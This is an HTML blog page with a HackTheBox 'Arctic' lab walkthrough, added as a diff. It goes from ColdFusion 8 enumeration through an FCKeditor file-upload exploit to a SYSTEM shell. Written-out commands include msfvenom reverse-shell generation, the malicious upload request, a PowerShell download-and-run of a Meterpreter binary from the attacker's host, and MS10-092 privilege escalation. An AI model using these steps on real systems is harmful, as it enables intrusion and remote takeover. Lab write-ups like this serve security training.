@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>HackTheBox: Arctic - ColdFusion Exploitation | Elliot Hacks</title>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <meta content="Complete walkthrough of HackTheBox Arctic machine. ColdFusion 8 exploitation, file upload vulnerability, privilege escalation to SYSTEM." name="description">
+    <meta content="hackthebox, arctic, coldfusion, cfm, file upload, windows exploitation, metasploit" name="keywords">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Heebo:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    
+    <style>
+        body {
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
+            font-family: 'Heebo', sans-serif;
+            color: #e0e0e0;
+            line-height: 1.7;
+        }
+        .matrix-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.02; pointer-events: none; }
+        .matrix-column { position: absolute; top: -100%; font-family: 'Fira Code', monospace; font-size: 12px; color: #00ff41; animation: matrix-fall linear infinite; }
+        @keyframes matrix-fall { 0% { top: -100%; } 100% { top: 100%; } }
+        .navigation-header { background: rgba(0, 0, 0, 0.95); backdrop-filter: blur(15px); border-bottom: 1px solid rgba(0, 255, 65, 0.3); position: fixed; width: 100%; top: 0; z-index: 1000; }
+        .nav-link-cyber { color: #00ff41 !important; transition: all 0.3s; }
+        .nav-link-cyber:hover { color: #39ff14 !important; text-shadow: 0 0 10px #00ff41; }
+        .writeup-container { margin-top: 100px; min-height: 100vh; }
+        .writeup-header { background: linear-gradient(45deg, rgba(0, 0, 0, 0.8), rgba(26, 26, 46, 0.6)); border: 1px solid rgba(0, 255, 65, 0.3); border-radius: 20px; padding: 2rem; margin-bottom: 2rem; }
+        .writeup-title { font-size: 2.5rem; font-weight: 900; color: #00ff41; text-shadow: 0 0 30px rgba(0, 255, 65, 0.5); font-family: 'Orbitron', monospace; }
+        .content-card { background: rgba(0, 0, 0, 0.8); border: 1px solid rgba(0, 255, 65, 0.2); border-radius: 15px; padding: 2rem; margin-bottom: 2rem; }
+        .content-card h2 { color: #00ff41; font-family: 'Orbitron', monospace; border-left: 4px solid #00ff41; padding-left: 1rem; margin-bottom: 1.5rem; }
+        .code-block { background: #0a0a0a; border: 1px solid #00ff41; border-radius: 10px; padding: 1rem; font-family: 'Fira Code', monospace; font-size: 0.85rem; overflow-x: auto; margin: 1rem 0; }
+        .flag { background: rgba(0, 255, 65, 0.1); border: 1px solid #00ff41; border-radius: 10px; padding: 0.5rem 1rem; font-family: 'Fira Code', monospace; color: #00ff41; display: inline-block; }
+        .tag { background: rgba(0, 255, 65, 0.1); border: 1px solid rgba(0, 255, 65, 0.3); border-radius: 20px; padding: 0.2rem 0.8rem; font-size: 0.8rem; font-family: 'Fira Code', monospace; color: #00ff41; display: inline-block; }
+        @media (max-width: 768px) { .writeup-title { font-size: 1.8rem; } .code-block { font-size: 0.7rem; } }
+    </style>
+</head>
+
+<body>
+    <div class="matrix-bg" id="matrix"></div>
+
+    <header class="navigation-header py-3">
+        <div class="container">
+            <div class="d-flex justify-content-between align-items-center">
+                <a href="../../" class="h3 mb-0 nav-link-cyber text-decoration-none">
+                    <i class="fas fa-terminal me-2"></i>@elliot-hacks
+                </a>
+                <nav class="d-none d-md-flex gap-4">
+                    <a href="../../" class="nav-link-cyber text-decoration-none">Home</a>
+                    <a href="../../about.html" class="nav-link-cyber text-decoration-none">About</a>
+                    <a href="../index.html" class="nav-link-cyber text-decoration-none">Publications</a>
+                </nav>
+            </div>
+        </div>
+    </header>
+
+    <div class="container writeup-container">
+        <div class="writeup-header">
+            <h1 class="writeup-title">HackTheBox: Arctic</h1>
+            <div class="mt-3">
+                <span class="tag"><i class="fas fa-fire me-1"></i>ColdFusion</span>
+                <span class="tag ms-2"><i class="fas fa-tag me-1"></i>Windows</span>
+                <span class="tag ms-2"><i class="fas fa-chart-simple me-1"></i>Easy</span>
+                <span class="tag ms-2"><i class="fas fa-upload me-1"></i>File Upload RCE</span>
+            </div>
+        </div>
+
+        <div class="content-card">
+            <h2><i class="fas fa-search me-2"></i>Step 1: Service Enumeration</h2>
+            <p>Initial Nmap scan reveals open ports including a webserver on port 8500:</p>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">[msf] >> db_nmap -p- -T5 --min-rate=5000 -Pn artic.htb
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+8500/tcp  open  fmtp
+49154/tcp open  unknown</pre>
+            </div>
+            <p class="mt-3">Version scan reveals ColdFusion 8 running on port 8500:</p>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">[msf] >> db_nmap -p135,8500,49154 -sVC -A artic.htb
+8500/tcp  open  http    ColdFusion 8
+Service Info: OS: Windows</pre>
+            </div>
+        </div>
+
+        <div class="content-card">
+            <h2><i class="fas fa-globe me-2"></i>Step 2: Web Enumeration</h2>
+            <p>Navigating to <code class="text-success">http://artic.htb:8500/CFIDE/administrator/</code> reveals the ColdFusion 8 admin login page. ColdFusion 8 is known to have multiple vulnerabilities.</p>
+            <p>Searching for available exploits:</p>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">┌─[elliot@parrot]─[~/cold]
+└──╼ $searchsploit coldfusion 8
+Adobe ColdFusion 8 - Remote Command Execution (RCE) | cfm/webapps/50057.py
+ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit) | cfm/webapps/16788.rb</pre>
+            </div>
+        </div>
+
+        <div class="content-card">
+            <h2><i class="fas fa-bug me-2"></i>Step 3: Creating Malicious Payload</h2>
+            <p>Generate a JSP reverse shell payload:</p>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">┌─[elliot@parrot]─[~/cold]
+└──╼ $msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=1234 -f raw > shell.jsp
+Payload size: 1497 bytes</pre>
+            </div>
+        </div>
+
+        <div class="content-card">
+            <h2><i class="fas fa-upload me-2"></i>Step 4: Exploiting File Upload</h2>
+            <p>Upload the malicious JSP file using the ColdFusion FCKeditor vulnerability:</p>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">┌─[elliot@parrot]─[~/cold]
+└──╼ $curl -X POST -F newfile=@shell.jsp \
+  'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/df.jsp%00'
+
+&lt;script type="text/javascript"&gt;
+    window.parent.OnUploadCompleted( 202, "", "shell.jsp", "0" );
+&lt;/script&gt;</pre>
+            </div>
+            <p>Trigger the uploaded shell:</p>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">┌─[elliot@parrot]─[~/cold]
+└──╼ $curl 'http://10.10.10.11:8500/userfiles/file/df.jsp'</pre>
+            </div>
+        </div>
+
+        <div class="content-card">
+            <h2><i class="fas fa-terminal me-2"></i>Step 5: Reverse Shell & User Flag</h2>
+            <p>Start a netcat listener to catch the reverse shell:</p>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">┌─[elliot@parrot]─[~/cold]
+└──╼ $rlwrap nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.15] from (UNKNOWN) [10.10.10.11] 49388
+Microsoft Windows [Version 6.1.7600]
+
+C:\ColdFusion8\runtime\bin>whoami
+arctic\tolis</pre>
+            </div>
+            <p>Navigate to user desktop for the user flag:</p>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">C:\>cd Users\tolis\Desktop
+C:\Users\tolis\Desktop>type user.txt
+<span class="flag">6a9ca50700ca9fc25e3eaacfc0268c3c</span></pre>
+            </div>
+        </div>
+
+        <div class="content-card">
+            <h2><i class="fas fa-crown me-2"></i>Step 6: Privilege Escalation to SYSTEM</h2>
+            <p>Check privileges with <code class="text-success">whoami /priv</code>:</p>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">C:\ColdFusion8>whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+SeImpersonatePrivilege      Enabled
+SeCreateGlobalPrivilege     Enabled</pre>
+            </div>
+            <p>Upload a Meterpreter payload for better post-exploitation:</p>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">┌─[elliot@parrot]─[~/cold]
+└──╼ $msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.15 lport=4321 -f exe > shell.exe
+
+┌─[elliot@parrot]─[~/cold]
+└──╼ $python -m http.server</pre>
+            </div>
+            <p>Download and execute on target:</p>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">C:\ColdFusion8\runtime\bin>powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.15:8000/shell.exe','shell.exe')"
+C:\ColdFusion8\runtime\bin>.\shell.exe</pre>
+            </div>
+            <p>Use local exploit suggester to find privilege escalation vector:</p>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">[msf] >> use exploit/windows/local/ms10_092_schelevator
+[msf] >> set SESSION 4
+[msf] >> set LHOST tun0
+[msf] >> set LPORT 4445
+[msf] >> run
+
+[*] Command shell session opened
+C:\Windows\system32>whoami
+nt authority\system</pre>
+            </div>
+            <p>Navigate to Administrator's Desktop for root flag:</p>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">C:\>cd Users\Administrator\Desktop
+C:\Users\Administrator\Desktop>type root.txt
+<span class="flag">dcdf90a06ce50f7ea4dba0c1cde61b3f</span></pre>
+            </div>
+        </div>
+
+        <div class="content-card">
+            <h2><i class="fas fa-clipboard-list me-2"></i>Key Takeaways</h2>
+            <ul>
+                <li><strong class="text-success">ColdFusion 8</strong> - Legacy Adobe ColdFusion with known RCE vulnerabilities</li>
+                <li><strong class="text-success">FCKeditor File Upload</strong> - Arbitrary file upload leading to RCE</li>
+                <li><strong class="text-success">SeImpersonatePrivilege</strong> - Enabled privilege allows token impersonation</li>
+                <li><strong class="text-success">MS10-092 Schelevator</strong> - Task scheduler privilege escalation</li>
+            </ul>
+            <hr>
+            <p class="mb-0"><i class="fas fa-shield-alt me-2"></i>This machine demonstrates the importance of keeping web applications updated and securing file upload functionality.</p>
+        </div>
+    </div>
+
+    <script>
+        function createMatrixRain() {
+            const matrix = document.getElementById('matrix');
+            const chars = '01';
+            for (let i = 0; i < 30; i++) {
+                const col = document.createElement('div');
+                col.className = 'matrix-column';
+                col.style.left = Math.random() * 100 + '%';
+                col.style.animationDuration = (Math.random() * 4 + 2) + 's';
+                col.style.animationDelay = Math.random() * 5 + 's';
+                let text = '';
+                for (let j = 0; j < 15; j++) text += chars.charAt(Math.floor(Math.random() * chars.length)) + '<br>';
+                col.innerHTML = text;
+                matrix.appendChild(col);
+            }
+        }
+        createMatrixRain();
+    </script>
+</body>
+</html>
